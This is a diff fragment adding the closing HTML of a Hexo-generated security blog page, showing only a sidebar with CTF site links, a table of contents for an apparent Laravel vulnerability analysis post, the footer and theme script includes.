+                    <a href="https://buuoj.cn" title="BUUCTF" target="_blank">BUUCTF</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adworld.xctf.org.cn/" title="攻防世界" target="_blank">攻防世界</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Laravel-项目文件夹结构"><span class="nav-number">2.</span> <span class="nav-text">Laravel 项目文件夹结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第一种漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">第一种漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二种漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">第二种漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">5.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peri0d</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="true"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
